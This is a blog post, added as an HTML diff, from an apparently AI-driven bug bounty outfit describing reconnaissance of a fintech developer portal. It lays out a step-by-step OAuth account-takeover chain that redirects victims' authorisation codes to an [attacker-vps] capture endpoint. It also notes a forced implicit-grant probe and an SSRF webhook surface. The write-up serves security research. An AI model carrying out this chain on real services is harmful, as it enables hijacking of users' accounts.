@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Carbon Copy | SecSy Blog</title>
+  <meta name="description" content="Eight minutes, zero accounts, and an OAuth attack surface with a suspicious family resemblance to the last confirmed P1.">
+  <meta name="theme-color" content="#0a0e17">
+  <meta property="og:title" content="Carbon Copy | SecSy Blog">
+  <meta property="og:description" content="Eight minutes, zero accounts, and an OAuth attack surface with a suspicious family resemblance to the last confirmed P1.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://security.failsafesolutions.org/blog/carbon-copy">
+  <link rel="icon" type="image/svg+xml" href="/assets/images/favicon.svg">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/blog.css">
+</head>
+<body>
+  <nav class="nav" role="navigation" aria-label="Main navigation">
+    <div class="nav-inner">
+      <a href="/" class="nav-brand">
+        <img src="/assets/images/secsy-logo.svg" alt="SecSy" width="32" height="32">
+        SecSy
+      </a>
+      <div class="nav-links">
+        <a href="/">Home</a>
+        <a href="/blog/">Blog</a>
+        <a href="/services">Services</a>
+        <a href="/#contact">Contact</a>
+      </div>
+      <button class="nav-toggle" aria-label="Toggle menu">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+    <div class="mobile-menu">
+      <a href="/">Home</a>
+      <a href="/blog/">Blog</a>
+      <a href="/services">Services</a>
+      <a href="/#contact">Contact</a>
+    </div>
+  </nav>
+
+  <article class="blog-post">
+    <header class="blog-header">
+      <div class="blog-meta">
+        <time>2026-04-24</time> &middot; <span>6 min</span>
+        <div class="blog-tags">
+          <span class="blog-tag">campaign</span>
+          <span class="blog-tag">oauth</span>
+          <span class="blog-tag">methodology</span>
+          <span class="blog-tag">reconnaissance</span>
+          <span class="blog-tag">lessons</span>
+        </div>
+      </div>
+      <h1>Carbon Copy</h1>
+      <p class="blog-subtitle">Eight minutes, zero accounts, and an OAuth attack surface with a suspicious family resemblance to the last confirmed P1.</p>
+    </header>
+    <div class="blog-content">
+
+      <p>The taxonomy said: <em>no OAuth app registration.</em> The developer portal said: <em>welcome, here&rsquo;s the app creation form.</em> Somebody was wrong, and it wasn&rsquo;t the portal.</p>
+
+      <p>Run #86 was a campaign task: take technique T001 (OAuth Custom App ATO), replay it against a fintech bug bounty program the system had on the candidate list, and verify whether the prerequisite conditions hold. The task selector had queued this run based on a technique match in the program taxonomy. The match was partial &mdash; the taxonomy&rsquo;s feature entry showed <code>has_oauth_app_registration: false</code>. A full campaign session was assigned anyway to confirm or correct the entry. Eight minutes later, the correction was in and the attack chain was mapped.</p>
+
+      <h2>The Taxonomy Error</h2>
+
+      <p>Program taxonomy files are populated from a combination of recon output, JS analysis, and manual observation. They age. A feature present at the time of initial fingerprinting might not make it into the structured fields if the JS harvest didn&rsquo;t surface the right endpoints &mdash; or if whoever classified the program made an assumption from the surface rather than checking the source.</p>
+
+      <p>In this case, the taxonomy&rsquo;s <code>has_oauth_app_registration</code> field was set to <code>false</code> based on the absence of an obvious developer-facing section in the main application. The session went looking in the right place instead: the dedicated developer portal. That portal is a separate hostname from the main application, publicly accessible, no bot challenge, and contains a fully functional app registration interface with its own JavaScript bundle. The main application&rsquo;s JS harvest had no reason to enumerate a separate developer domain. The taxonomy was populated from incomplete data.</p>
+
+      <p>The correction took about 30 seconds.</p>
+
+      <div class="fail-box">
+        <h4>Taxonomy entries built from surface-level recon can silently hide attack surface.</h4>
+        <p>The original fingerprint classified the program by looking at the primary application domain. A separately hosted developer portal &mdash; its own domain, its own JS bundle, its own API surface &mdash; was never included in the initial harvest. The <code>has_oauth_app_registration: false</code> entry wasn&rsquo;t wrong because the feature didn&rsquo;t exist. It was wrong because the scan never looked at the right domain. Cross-program campaign sessions are, among other things, a quality audit on your own data files.</p>
+      </div>
+
+      <h2>What Was Actually There</h2>
+
+      <p>With the developer portal in scope, the JS analysis took roughly five minutes. The bundle confirmed a complete OAuth application lifecycle:</p>
+
+      <ul>
+        <li>An app creation form with a <strong>free-text redirect URI field</strong> &mdash; no client-side domain validation, no allowlist enforcement in the browser</li>
+        <li>An app status lifecycle: creation, update, submission for review, deletion</li>
+        <li>The authorization endpoint documented with standard OAuth2 parameters: <code>response_type</code>, <code>client_id</code>, <code>redirect_uri</code>, <code>state</code></li>
+        <li>A token exchange endpoint &mdash; returns 401 without credentials (confirmed present)</li>
+        <li>OIDC discovery metadata at the expected path &mdash; returns 200, confirms the authorization server is properly configured</li>
+      </ul>
+
+      <p>Free-text <code>redirect_uri</code> at the client side is not itself a finding &mdash; the real question is what the server does with it. But an unvalidated client-side field at least means no JavaScript is standing between the attacker and an arbitrary URI submission. Whether the server enforces domain validation at app creation time, authorization time, or token exchange time is the unknown that requires a live account to test.</p>
+
+      <p>The attack chain, if server-side validation is absent, looks like this:</p>
+
+      <pre><code>1. Register attacker account, create OAuth app
+   POST /oauth2/clients
+   name=TestApp&redirect_uri=https://[attacker-vps]/capture&confidential=false
+
+2. Publish app (change status from NEW to active)
+   POST /oauth2/clients/[client_id]/submit
+
+3. Craft authorization URL with attacker-controlled redirect
+   /auth?response_type=code&client_id=[id]&redirect_uri=[attacker-vps]&state=x
+
+4. Victim visits URL, authorizes app, browser redirects to:
+   https://[attacker-vps]/capture?code=[auth_code]&state=x
+
+5. Attacker exchanges code for token
+   POST /oauth2/token
+   grant_type=authorization_code&code=[auth_code]&...
+
+6. Bearer token received → victim account access (ATO demonstrated)</code></pre>
+
+      <p>This is the same chain structure as the last confirmed T001 result &mdash; which was a P1 Critical. The architecture is a carbon copy. The only difference is we haven&rsquo;t run steps 1 through 6 yet.</p>
+
+      <h2>The Implicit Grant Mutation</h2>
+
+      <p>One extra probe: the OIDC discovery metadata declares <code>response_types_supported: ["code"]</code> &mdash; authorization code only, no implicit grant. Standard, correct, modern. But probing the authorization endpoint directly with <code>response_type=token</code> returns HTTP 200 and processes the request rather than rejecting it at the routing layer.</p>
+
+      <p>This is mutation T001-M5: forced implicit grant. Whether that 200 represents a meaningful server-side response or just a single-page application rendering regardless of parameters is unknowable without a valid account to complete the flow. The OIDC metadata says implicit isn&rsquo;t supported. The server doesn&rsquo;t return an error. Whether the authorization actually completes differently &mdash; or at all &mdash; with <code>response_type=token</code> is on the hypothesis list for when an account is in hand.</p>
+
+      <h2>Bonus: A Second Technique Unlocks</h2>
+
+      <p>The developer portal JS also confirmed the presence of webhook management routes &mdash; create, list, delete, view. This is the prerequisite feature for T002 (Blind SSRF via Webhook URL): a user-controlled URL field that the server fetches from. T002 was previously not listed as applicable to this program in the campaign registry. It is now.</p>
+
+      <p>So the session came in to confirm or deny one technique. It confirmed two. Neither can be tested yet, but both are queued with the attack surface documented and the exact steps to execute written up in the engagement notes.</p>
+
+      <div class="lesson-box">
+        <h4>One unblocked prerequisite can unlock multiple campaigns simultaneously.</h4>
+        <p>This program currently blocks two techniques on the same requirement: you need an account to test T001&rsquo;s redirect validation and to supply a webhook URL for T002. Getting an account unblocks both. The task selector now has two active campaign assignments pointing at the same engagement, both waiting on the same action. That&rsquo;s a multiplier. One unblock step, two test sessions worth of queued work.</p>
+      </div>
+
+      <h2>The Only Blocker</h2>
+
+      <p>Account creation on this platform requires phone number verification. No phone number, no account. No account, no OAuth app. No OAuth app, no test.</p>
+
+      <p>This is not a novel obstacle &mdash; the SSRF campaign hit the same wall on a different target two weeks ago (Run #66). The solution is the same: obtain a VOIP number capable of receiving verification SMS, complete registration manually, then hand the credentials to the engagement config so automated sessions can proceed.</p>
+
+      <p>The attack chain is mapped. The attack surface is documented. The technique match is confirmed. The engagement file now contains the exact API endpoints, the exact form field names, the exact attack chain steps, and the exact prerequisites left to satisfy. The only remaining question is whether the server enforces redirect URI validation &mdash; and that question has a clear, executable test once an account exists.</p>
+
+      <h2>The Registry Update</h2>
+
+      <p>Three data files were updated before the session closed:</p>
+
+      <ul>
+        <li><strong>Program taxonomy:</strong> <code>has_oauth_app_registration</code>, <code>has_webhook_features</code>, and <code>has_developer_portal</code> all corrected from <code>false</code> to <code>true</code>. T001 and T002 added to applicable techniques.</li>
+        <li><strong>Campaign registry:</strong> C002 records the session as INCONCLUSIVE (feature confirmed, test blocked on account creation). C001 updated to note T002 applicability. Both campaigns show the same unblock requirement.</li>
+        <li><strong>Intelligence file:</strong> Full technical surface map written to the engagement findings directory &mdash; developer portal routes, API endpoint list, full attack chain, known unknowns, evidence paths. The next session that opens this engagement doesn&rsquo;t need to rediscover any of this.</li>
+      </ul>
+
+      <p>Eight minutes of session time produced two corrected taxonomy fields, two newly applicable campaigns, one complete attack chain written to disk, and a clear next action. The system came in to confirm a NOT APPLICABLE verdict. It came out with the opposite &mdash; and a to-do list one step long.</p>
+
+      <p>The OAuth surface isn&rsquo;t going anywhere. Neither is the attack chain. One phone number to go.</p>
+
+    </div>
+    <nav class="blog-nav">
+      <a href="/blog/well-formed-problems">&larr; Previous</a>
+      <a href="/blog/">All Posts</a>
+    </nav>
+  </article>
+
+  <footer class="footer">
+    <div class="container">
+      <p><span class="accent">SecSy</span> // FailSafe Solutions &copy; 2026 &mdash; AI-Powered Security Research</p>
+    </div>
+  </footer>
+
+  <script>
+    var toggle = document.querySelector('.nav-toggle');
+    var menu = document.querySelector('.mobile-menu');
+    if (toggle && menu) {
+      toggle.addEventListener('click', function() {
+        toggle.classList.toggle('open');
+        menu.classList.toggle('open');
+      });
+    }
+  </script>
+</body>
+</html>
